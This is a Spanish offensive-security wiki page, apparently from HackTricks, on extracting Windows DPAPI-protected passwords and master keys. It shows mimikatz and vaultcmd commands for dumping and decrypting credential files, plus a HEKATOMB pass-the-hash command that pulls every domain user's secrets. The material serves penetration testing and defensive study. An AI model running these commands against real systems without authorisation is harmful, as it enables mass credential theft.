# DPAPI - Extracción de Contraseñas

{{#include ../../banners/hacktricks-training.md}}



## ¿Qué es DPAPI?

La API de Protección de Datos (DPAPI) se utiliza principalmente dentro del sistema operativo Windows para la **cifrado simétrico de claves privadas asimétricas**, aprovechando secretos de usuario o del sistema como una fuente significativa de entropía. Este enfoque simplifica el cifrado para los desarrolladores al permitirles cifrar datos utilizando una clave derivada de los secretos de inicio de sesión del usuario o, para el cifrado del sistema, los secretos de autenticación del dominio del sistema, eliminando así la necesidad de que los desarrolladores gestionen la protección de la clave de cifrado ellos mismos.

### Datos Protegidos por DPAPI

Entre los datos personales protegidos por DPAPI se encuentran:

- Contraseñas y datos de autocompletado de Internet Explorer y Google Chrome
- Contraseñas de cuentas de correo electrónico y FTP interno para aplicaciones como Outlook y Windows Mail
- Contraseñas para carpetas compartidas, recursos, redes inalámbricas y Windows Vault, incluyendo claves de cifrado
- Contraseñas para conexiones de escritorio remoto, .NET Passport y claves privadas para diversos propósitos de cifrado y autenticación
- Contraseñas de red gestionadas por el Administrador de Credenciales y datos personales en aplicaciones que utilizan CryptProtectData, como Skype, MSN messenger y más

## List Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Archivos de Credenciales

Los **archivos de credenciales protegidos** podrían estar ubicados en:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Obtén información de credenciales usando mimikatz `dpapi::cred`, en la respuesta puedes encontrar información interesante como los datos encriptados y el guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
Puedes usar el **módulo mimikatz** `dpapi::cred` con el `/masterkey` apropiado para descifrar:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## Master Keys

Las claves DPAPI utilizadas para encriptar las claves RSA del usuario se almacenan en el directorio `%APPDATA%\Microsoft\Protect\{SID}`, donde {SID} es el [**Identificador de Seguridad**](https://en.wikipedia.org/wiki/Security_Identifier) **de ese usuario**. **La clave DPAPI se almacena en el mismo archivo que la clave maestra que protege las claves privadas del usuario**. Generalmente son 64 bytes de datos aleatorios. (Nota que este directorio está protegido, por lo que no puedes listar su contenido usando `dir` desde el cmd, pero puedes listarlo desde PS).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Esto es lo que un conjunto de Claves Maestras de un usuario se verá así:

![](<../../images/image (1121).png>)

Usualmente **cada clave maestra es una clave simétrica encriptada que puede desencriptar otro contenido**. Por lo tanto, **extraer** la **Clave Maestra encriptada** es interesante para **desencriptar** más tarde ese **otro contenido** encriptado con ella.

### Extraer clave maestra y desencriptar

Consulta la publicación [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) para un ejemplo de cómo extraer la clave maestra y desencriptarla.

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) es un puerto en C# de algunas funcionalidades de DPAPI del proyecto [Mimikatz](https://github.com/gentilkiwi/mimikatz/) de [@gentilkiwi](https://twitter.com/gentilkiwi).

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) es una herramienta que automatiza la extracción de todos los usuarios y computadoras del directorio LDAP y la extracción de la clave de respaldo del controlador de dominio a través de RPC. El script resolverá todas las direcciones IP de las computadoras y realizará un smbclient en todas las computadoras para recuperar todos los blobs de DPAPI de todos los usuarios y desencriptar todo con la clave de respaldo del dominio.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

¡Con la lista de computadoras extraídas de LDAP puedes encontrar cada subred incluso si no las conocías!

"Porque los derechos de Administrador de Dominio no son suficientes. Hackea a todos."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) puede volcar secretos protegidos por DPAPI automáticamente.

## Referencias

- [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

{{#include ../../banners/hacktricks-training.md}}
